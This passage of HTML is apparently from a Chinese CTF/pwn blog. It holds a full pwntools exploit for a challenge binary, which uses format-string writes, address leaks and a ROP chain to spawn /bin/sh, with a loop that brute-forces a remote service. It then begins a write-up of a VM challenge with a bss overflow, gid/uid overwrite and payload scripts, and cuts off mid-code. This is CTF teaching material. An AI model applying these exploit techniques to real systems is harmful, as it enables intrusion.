payload = <span class="string">&quot;&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n%&quot;</span>.<span class="built_in">format</span>(magic_stack2,magic_main-<span class="number">1</span>+<span class="number">2</span>*y-magic_stack2).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>还有最后一个问题：由于破坏了栈结构，导致 <code>system(&quot;/bin/sh&quot;)</code> 失效，如果构造 <code>execve(&quot;/bin/sh&quot;,0,0)</code> 则会受到格式化字符串 <code>%n</code> 的限制（写入的数据不能为“0”）</p>
<p>此时我们可以先构造 <code>sys_read(0,stack,size)</code>，然后在栈上输入 ROP（利用 gadget 控制对应寄存器为“0”即可）</p>
<p>在 DEBUG 模式的配合下，勉强写出了可以在 DEBUG 模式中打通的 exp，但正常执行的程序怎么都爆破不出来，后来发现是 DEBUG 模式和正常模式的栈空间不太一样，修正 exp 后理论上可以爆破出 flag（关闭随机化后就可以打出 flag，但 1/4096 的概率太低了）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./bad1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\nb *$rebase(0x1254)\n&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot; b *$rebase(0x1226)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="keyword">global</span> magic_stack2</span><br><span class="line">    <span class="keyword">if</span>(target &lt; <span class="number">0x10000</span>):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">      magic_gadget = (target &gt;&gt; <span class="number">16</span>*i)%<span class="number">0x10000</span></span><br><span class="line">      success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line">      <span class="keyword">if</span>(magic_stack1 &gt; magic_gadget):</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadget,magic_stack1-<span class="number">1</span>-magic_gadget).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">      y = i+<span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(magic_stack2 &gt; magic_main):</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span class="number">1</span>+<span class="number">2</span>*y-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n%&quot;</span>.<span class="built_in">format</span>(magic_stack2,magic_main-<span class="number">1</span>+<span class="number">2</span>*y-magic_stack2).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  magic = <span class="number">0xdc08</span>-<span class="number">0x38</span></span><br><span class="line">  payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n%6$p\n&quot;</span></span><br><span class="line">  payload += <span class="string">&quot;%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  libc_base = leak_addr - <span class="number">0x114992</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  pro_base  = leak_addr - <span class="number">0x1248</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  stack_addr = leak_addr - <span class="number">0x148</span></span><br><span class="line">  success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">  success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">  success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">  io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">  one_gadget = libc_base + <span class="number">0x50a37</span></span><br><span class="line">  system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">  binsh_addr = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">  pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">  pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">  pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">  pop_rcx_ret = libc_base + <span class="number">0x000000000008c6bb</span></span><br><span class="line">  pop_rbx_ret = libc_base + <span class="number">0x0000000000035dd1</span></span><br><span class="line">  pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">  syscall_ret = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">  mov_rdi_rbx_call_rcx = libc_base + <span class="number">0x000000000015e9d8</span></span><br><span class="line">  add_rax_1_ret = libc_base + <span class="number">0x00000000000d83b0</span></span><br><span class="line">  mov_rax_n1_ret = libc_base + <span class="number">0x000000000004244e</span></span><br><span class="line">  mov_rdx_256_ret =libc_base + <span class="number">0x00000000000ecfe7</span></span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">  success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">  success(<span class="string">&quot;binsh_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">  success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">  success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">  magic_stack1 = (stack_addr + <span class="number">0x18</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_stack2 = (stack_addr + <span class="number">0x38</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_main = (pro_base + <span class="number">0x123B</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_one1 = (one_gadget)%<span class="number">0x10000</span></span><br><span class="line">  magic_one2 = (one_gadget &gt;&gt; <span class="number">16</span>)%<span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span class="number">1</span>-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  pwn(pop_rsi_ret)</span><br><span class="line">  pwn(stack_addr+<span class="number">0x80</span>)</span><br><span class="line">  pwn(mov_rdx_256_ret)</span><br><span class="line">  pwn(mov_rax_n1_ret)</span><br><span class="line">  pwn(add_rax_1_ret)</span><br><span class="line">  pwn(pop_rcx_ret)</span><br><span class="line">  pwn(binsh_addr)</span><br><span class="line">  pwn(pop_rcx_ret)</span><br><span class="line">  pwn(syscall_ret)</span><br><span class="line">  pwn(mov_rdi_rbx_call_rcx)</span><br><span class="line"></span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,<span class="string">&quot;1&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,<span class="string">&quot;2&quot;</span>*<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">  payload = p64(pop_rax_ret)+p64(<span class="number">59</span>)+p64(pop_rdi_ret)+p64(binsh_addr)+p64(pop_rsi_ret)+p64(<span class="number">0</span>)+p64(pop_rdx_r12_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">  sla(<span class="string">&quot;22222222222222222222222222222222&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    local = <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">      p = process(challenge)</span><br><span class="line">      <span class="comment">#p = gdb.debug(challenge, cmd)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    exp()</span><br><span class="line">    sla(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line">    flag = p.recvline()</span><br><span class="line">    success(<span class="string">&quot;flag &gt;&gt; &quot;</span>+flag)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  <span class="keyword">except</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/24/VM%20pwn+bss%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">VM pwn+bss溢出</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-06-24 09:45:44 / Modified: 09:48:32" itemprop="dateCreated datePublished" datetime="2023-06-24T09:45:44+08:00">2023-06-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.8k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>vmbyhrp</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">HRPVM: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, BuildID[sha1]=ae19ec35e351cd7e0113b04270566c04bd3bd321, <span class="keyword">not</span> stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p><strong>漏洞分析</strong></p>
<p>在 DEBUG 命令中有读取任意文件的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;FILE NAME:&quot;</span>);</span><br><span class="line">name = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">read(<span class="number">0</span>, name, <span class="number">0x20</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)name);</span><br><span class="line">stream = fopen((<span class="keyword">const</span> <span class="keyword">char</span> *)name, <span class="string">&quot;ab+&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( stream )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="keyword">unsigned</span> <span class="keyword">int</span>)__isoc99_fscanf(stream, <span class="string">&quot;%c&quot;</span>, &amp;data[i]) != <span class="number">-1</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  fclose(stream);</span><br><span class="line">  HF[file_count].fd = global_fd;</span><br><span class="line">  HF[file_count].name = (<span class="keyword">char</span> *)name;</span><br><span class="line">  HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">  count = file_count;</span><br><span class="line">  HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">strncpy</span>((<span class="keyword">char</span> *)HF[file_count].data, data, <span class="number">0x1000</span>uLL);</span><br><span class="line">  ++file_count;</span><br><span class="line">  ++global_fd;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>DEBUG 命令需要覆盖 gid 和 uid</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(system_cmd[<span class="number">6</span>], (<span class="keyword">const</span> <span class="keyword">char</span> *)buf, len) &amp;&amp; !gid &amp;&amp; !uid )<span class="comment">// debug</span></span><br><span class="line">  DEBUG();</span><br></pre></td></tr></table></figure>
<p>全局变量 <code>file_count</code> 没有限制大小，导致 <code>HF</code> 可以向下溢出到 gid 和 uid</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HF[file_count].fd = global_fd;</span><br><span class="line">HF[file_count].name = name;</span><br><span class="line">HF[file_count].size = <span class="number">1000LL</span>;</span><br><span class="line">count = file_count;</span><br><span class="line">HF[count].data = (__int64)<span class="built_in">malloc</span>(<span class="number">0x1000</span>uLL);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;FILE CONTENT: &quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="keyword">void</span> *)HF[file_count].data, <span class="number">0x1000</span>uLL);</span><br><span class="line">deleEnter((<span class="keyword">const</span> <span class="keyword">char</span> *)HF[file_count].data);</span><br><span class="line">++file_count;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>使用如下两个脚本并配合溢出可以很轻松地覆盖 gid 和 uid：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">payload =  <span class="string">&quot;mov rdi,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rsi,36;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rdx,1001;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;mov rax,1;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;call write,1;&quot;</span></span><br><span class="line"></span><br><span class="line">payload2 =  <span class="string">&quot;mov rdi,35;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rsi,0;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;mov rax,2;&quot;</span></span><br><span class="line">payload2 += <span class="string">&quot;call open,2;&quot;</span></span><br></pre></td></tr></table></figure>
<p>但 DEBUG 退出时会置空全局变量 <code>dest</code> 导致后续程序触发段错误：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deleEnter(buf);</span><br><span class="line">gid = <span class="number">1000</span>;</span><br><span class="line">uid = <span class="number">1000</span>;</span><br><span class="line"><span class="built_in">strncpy</span>(dest, src, <span class="number">8uLL</span>);</span><br><span class="line">machine_start();</span><br></pre></td></tr></table></figure>
<p>在 <code>login_system</code> 函数中可以往全局变量 <code>dest</code> 中写入数据：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;[+]HOLDER:&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, dest, <span class="number">0x10</span>uLL);</span><br></pre></td></tr></table></figure>
<p>在 mmap 命令中可以使用 mmap 创建一片合法的空间：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(debug_cmd[<span class="number">4</span>], buf, len) )     <span class="comment">// mmap</span></span><br><span class="line">&#123;</span><br><span class="line">  addr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+]ADDR EXPEND:&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%lld&quot;</span>, &amp;addr);</span><br><span class="line">  mmap(addr, <span class="number">0x400</span>uLL, <span class="number">3</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>于是我们可以在 DEBUG 使用 mmap 指令创建合法空间，然后 reboot 调用 <code>login_system</code> 并写入合法空间，这样就不会发生段错误了</p>
<p>剩下的操作就是程序的正常功能，完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span 